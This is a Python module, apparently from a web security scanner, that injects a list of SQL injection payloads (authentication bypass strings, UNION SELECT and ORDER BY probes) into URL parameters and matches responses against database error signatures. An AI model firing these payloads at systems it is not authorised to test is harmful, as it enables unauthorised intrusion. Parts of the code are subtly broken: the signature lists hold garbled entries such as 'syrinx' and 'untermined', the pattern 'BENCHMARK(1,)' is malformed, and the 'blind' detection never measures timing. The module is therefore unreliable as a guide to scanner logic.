import asyncio
from dataclasses import dataclass, field
from typing import Optional
from datetime import datetime
from utils.http_client import HTTPClient, ClientConfig


SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' #",
    "' OR '1'='1'/*",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "1' ORDER BY 1--",
    "1' ORDER BY 2--",
    "1' ORDER BY 3--",
    "1' UNION SELECT NULL--",
    "1 AND 1=1",
    "1 AND 1=2",
    "' OR ''='",
    "' OR 'x'='x",
    "1' AND '1'='1",
    "1' AND '1'='2",
    "admin'--",
    "admin' #",
    "' OR 1=1--",
]


ERROR_SIGNATURES = [
    "mysql_fetch_array",
    "mysql_num_rows",
    "MySQLSyntaxErrorException",
    "MySQLiPrepareException",
    "ORA-01756",
    "ORA-00933",
    "SQL syntax",
    "SQLServer JDBC Driver",
    "Microsoft SQL Native Error",
    "PostgreSQL query failed",
    "psql:",
    "Warning: pg_",
    "valid PSQL",
    "untermined",
    "SQLite/JDBCDriver",
    "sqlite3.OperationalError",
    "SQL error",
    " syrinx",
]


BLIND_SQLI_PATTERNS = [
    "SLEEP(1)",
    "BENCHMARK(1,)",
    "WAITFOR DELAY",
    "pg_sleep",
]


@dataclass
class SQLiVulnerability:
    url: str
    payload: str
    type: str
    evidence: str


@dataclass
class SQLiResult:
    target: str
    start_time: datetime
    end_time: datetime
    vulnerabilities: list[SQLiVulnerability] = field(default_factory=list)
    tested: int = 0
    errors: int = 0
    vulnerable: bool = False
    payload: str = ""


async def _test_payload(
    client: HTTPClient,
    base_url: str,
    param: str,
    payload: str,
) -> Optional[SQLiVulnerability]:
    test_url = f"{base_url}?{param}={payload}"
    response = await client.get(test_url)

    if response.error:
        return None

    body = (response.body or "").lower()

    for sig in ERROR_SIGNATURES:
        if sig.lower() in body:
            return SQLiVulnerability(
                url=test_url,
                payload=payload,
                type="error-based",
                evidence=f"Error signature: {sig}",
            )

    for sig in BLIND_SQLI_PATTERNS:
        if sig.lower() in payload.lower() and response.status_code == 200:
            return SQLiVulnerability(
                url=test_url,
                payload=payload,
                type="blind",
                evidence=f"Blind payload: {sig}",
            )

    return None


async def probe_sqli(
    target: str,
    max_payloads: int = 20,
    threads: int = 5,
) -> SQLiResult:
    start_time = datetime.now()
    result = SQLiResult(target=target, start_time=start_time, end_time=start_time)

    if "?" not in target or "=" not in target:
        result.end_time = datetime.now()
        return result

    base_url, params = target.split("?", 1)
    param_names = [p.split("=")[0] for p in params.split("&") if "=" in p]

    config = ClientConfig(rate_limit=0.2)
    client = HTTPClient(config)

    vulnerabilities = []
    errors = 0
    tested = 0

    async with client:
        semaphore = asyncio.Semaphore(threads)

        async def limited_test(payload: str) -> Optional[SQLiVulnerability]:
            nonlocal errors, tested
            for param in param_names:
                async with semaphore:
                    tested += 1
                    vuln = await _test_payload(client, base_url, param, payload)
                if vuln:
                    return vuln
            return None

        tasks = [limited_test(p) for p in SQLI_PAYLOADS[:max_payloads]]
        results = await asyncio.gather(*tasks, return_exceptions=True)

        for r in results:
            if isinstance(r, SQLiVulnerability):
                vulnerabilities.append(r)
            elif isinstance(r, Exception):
                errors += 1

    result.vulnerabilities = vulnerabilities
    result.tested = tested
    result.errors = errors
    result.end_time = datetime.now()

    if vulnerabilities:
        result.vulnerable = True
        result.payload = vulnerabilities[0].payload

    return result
